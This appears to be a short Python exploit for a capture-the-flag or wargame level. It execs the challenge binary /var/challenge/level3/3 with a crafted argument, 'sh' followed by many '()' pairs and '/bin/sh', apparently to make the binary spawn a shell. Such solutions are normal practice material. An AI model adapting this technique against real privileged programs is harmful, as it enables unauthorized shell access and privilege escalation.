import os

filename = b"/var/challenge/level3/3"
argv = [b"3", b"sh" + b"()"*100 + b"/bin/sh"]
os.execv(filename, argv)